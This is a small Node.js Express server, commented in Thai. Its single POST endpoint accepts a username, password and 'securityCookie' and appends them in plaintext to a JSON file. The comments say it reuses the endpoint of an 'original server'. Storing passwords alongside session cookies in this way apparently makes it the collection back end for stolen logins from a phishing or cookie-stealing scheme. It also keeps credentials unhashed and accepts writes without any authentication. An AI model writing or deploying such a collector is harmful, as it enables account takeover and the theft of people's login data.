const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const app = express();

app.use(express.json());

// เส้นทางสำหรับเก็บไฟล์ JSON
const dataFilePath = path.join(__dirname, 'accounts.json');

// ตรวจสอบว่าไฟล์ JSON มีอยู่หรือไม่ ถ้าไม่มีให้สร้างไฟล์เปล่า
async function initializeFile() {
    try {
        await fs.access(dataFilePath);
    } catch (error) {
        await fs.writeFile(dataFilePath, JSON.stringify([]));
    }
}

// ฟังก์ชันเพื่ออ่านข้อมูลจากไฟล์
async function readAccounts() {
    const data = await fs.readFile(dataFilePath, 'utf8');
    return JSON.parse(data);
}

// ฟังก์ชันเพื่อเขียนข้อมูลลงไฟล์
async function writeAccounts(accounts) {
    await fs.writeFile(dataFilePath, JSON.stringify(accounts, null, 2));
}

// เริ่มต้นไฟล์เมื่อเซิร์ฟเวอร์เริ่ม
initializeFile();

// ใช้ endpoint เดียวกับเซิร์ฟเวอร์เดิม (/api/new_endpoint)
app.post('/api/new_endpoint', async (req, res) => {
    const { username, password, securityCookie } = req.body;

    try {
        const accounts = await readAccounts();
        accounts.push({ username, password, securityCookie });
        await writeAccounts(accounts);
        res.json({ message: 'Data saved successfully' });
    } catch (error) {
        console.error('Error saving data:', error);
        res.status(500).json({ error: 'Failed to save data' });
    }
});

module.exports = app;